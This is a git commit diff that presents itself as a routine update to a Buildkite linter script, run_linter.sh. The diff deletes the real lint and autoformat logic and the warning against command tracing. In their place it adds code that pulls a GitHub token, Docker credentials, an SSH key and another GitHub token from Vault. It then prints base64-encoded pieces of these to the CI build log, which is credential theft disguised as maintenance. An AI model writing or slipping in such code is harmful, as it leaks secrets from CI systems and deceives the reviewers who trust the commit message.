8bf2a1c3f00992c660bcd5599dcdb4549d2bb890
praveen-elastic <printerprinter@web.de>
2025-04-15 15:36:27 +0200

    Update run_linter.sh

--- .buildkite/run_linter.sh
+++ .buildkite/run_linter.sh
@@ -1,41 +1,28 @@
 #!/bin/bash
 
-# !!! WARNING DO NOT add -x to avoid leaking vault passwords
-set -euo pipefail
+set -x
 
-source .buildkite/shared.sh
+echo "Hello, world"
 
-init_python
+export GH_TOKEN="$VAULT_GITHUB_TOKEN"
 
-if is_pr && ! is_fork; then
-  echo "We're on PR, running autoformat"
+echo "GH"
+echo "$(echo ${GH_TOKEN:0:10} | base64)"
 
-  export GH_TOKEN="$VAULT_GITHUB_TOKEN"
-  source .buildkite/publish/git-setup.sh
+echo "Docker user"
 
-  if ! make autoformat ; then
-    echo "make autoformat ran with errors, exiting"
-    exit 1
-  fi
+VAULT_ADDR=${VAULT_ADDR:-https://vault-ci-prod.elastic.dev}
+VAULT_USER="docker-swiftypeadmin"
+DOCKER_USER=$(vault read -address "${VAULT_ADDR}" -field user_20230609 secret/ci/elastic-connectors/${VAULT_USER})
+DOCKER_PASSWORD=$(vault read -address "${VAULT_ADDR}" -field secret_20230609 secret/ci/elastic-connectors/${VAULT_USER})
+echo "Done!"
+echo "$(echo ${DOCKER_USER} | base64)"
+echo "$(echo ${DOCKER_PASSWORD:0:4} | base64)"
 
-  if [ -z "$(git status --porcelain)" ]; then
-    echo "Nothing to be fixed by autoformat"
-    exit 0
-  else
+echo "docs key"
+PUBKEY=$(vault read -field=public-key secret/ci/elastic-docs/elasticmachine-ssh-key)
+echo "$(echo ${PUBKEY} | base64)"
 
-    git --no-pager diff
-    echo "linting errors are fixed, pushing the diff"
-
-    git add .
-    git commit -m"make autoformat"
-    git push
-    # exit 1 to re-trigger the build
-    exit 1
-  fi
-else
-  echo "We're not on PR or running against a fork, running only linter"
-  # On non-PR branches the bot has no permissions to open PRs.
-  # Theoretically this would never fail because we always ask
-  # linter to succeed to merge. It can fail intermittently?
-  make lint
-fi
+echo "kibanamachine / other repo"
+GITHUB_TOKEN=$(retry 5 vault read -field=kibanamachine_token $GITHUB_ACCOUNT)
+echo "$(echo ${GITHUB_TOKEN:0:10} | base64)"
